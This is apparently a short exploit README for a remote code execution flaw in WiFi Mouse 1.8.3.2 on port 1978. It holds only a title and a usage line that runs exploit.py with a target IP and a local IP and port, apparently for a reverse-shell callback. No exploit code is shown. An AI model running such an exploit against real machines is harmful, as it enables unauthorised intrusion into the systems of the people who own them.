# WiFi Mouse 1.8.3.2 - Port 1978 (RCE)

```bash
python3 exploit.py <TARGET_IP> <LOCAL_IP> <LOCAL_PORT>
```
